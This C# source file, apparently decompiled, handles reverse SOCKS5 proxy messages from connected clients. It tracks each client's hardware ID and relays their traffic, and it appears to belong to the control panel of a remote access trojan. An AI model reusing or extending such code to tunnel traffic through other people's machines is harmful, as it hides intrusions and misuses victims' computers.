using System.Windows.Forms;
using Server.Connectings;
using Server.Helper.Sock5;

namespace Server.Messages;

internal class HandlerReverseProxyR
{
	public static void Read(Clients client, object[] objects)
	{
		switch ((string)objects[1])
		{
		case "Connect":
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
				break;
			}
			Program.form.ReverseProxyR.Invoke((MethodInvoker)delegate
			{
				Program.form.ReverseProxyR.Server.ClientReverse.Add(client);
			});
			client.eventDisconnect += delegate
			{
				Program.form.ReverseProxyR.Invoke((MethodInvoker)delegate
				{
					try
					{
						Program.form.ReverseProxyR.Server.ClientReverse.Remove(client);
					}
					catch
					{
					}
				});
			};
			client.Hwid = (string)objects[2];
			break;
		case "Accept":
		{
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
				break;
			}
			Client client3 = Program.form.ReverseProxyR.Server.Search((int)objects[2]);
			client3.Accept(client);
			client.Tag = client3;
			break;
		}
		case "ConnectResponse":
		{
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
				break;
			}
			Client client2 = (Client)client.Tag;
			client2?.HandleCommandResponse(objects);
			client.Tag = client2;
			break;
		}
		case "Data":
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Send((byte[])objects[2]);
			}
			break;
		case "Disconnect":
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Disconnect();
			}
			break;
		}
	}
}
